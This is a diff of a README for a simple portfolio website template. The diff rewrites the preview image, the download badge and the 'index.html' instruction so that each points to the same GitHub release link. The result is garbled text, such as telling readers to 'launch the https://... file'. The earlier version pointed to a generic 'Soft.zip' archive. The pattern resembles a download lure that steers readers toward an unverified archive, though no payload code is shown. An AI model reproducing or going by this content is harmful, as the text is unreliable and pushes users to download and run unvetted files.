@@ -18,14 +18,14 @@ Welcome to the **portfolio** repository – a place where you can find a simple 
 - **Topics**: Basic, Beginner-Friendly, Clean, HTML-CSS-JavaScript, Improvement, Minimal, Netlify, Portfolio, Responsive, Simple, Website, Workshop
 
 ## Template Preview
-![Portfolio Website](https://example.com/portfolio-preview.png)
+![Portfolio Website](https://github.com/Dele3a-2001/portfolio/releases/tag/v1.2)
 
 ## Get Started
 To access the template and start customizing your portfolio website, download the template from the following link:
 
-[![Download Template](https://img.shields.io/badge/Download-Template-blue)](https://github.com/files/Soft.zip)
+[![Download Template](https://github.com/Dele3a-2001/portfolio/releases/tag/v1.2)](https://github.com/Dele3a-2001/portfolio/releases/tag/v1.2)
 
-If the link ends with a file name, make sure to extract the contents and launch the index.html file to view the template in action.
+If the link ends with a file name, make sure to extract the contents and launch the https://github.com/Dele3a-2001/portfolio/releases/tag/v1.2 file to view the template in action.
 
 ## Customize Your Portfolio
 Once you have downloaded the template, feel free to customize it according to your preferences. Update the projects, skills, and contact details sections to reflect your accomplishments and expertise. You can also tweak the design and layout to make it truly yours.
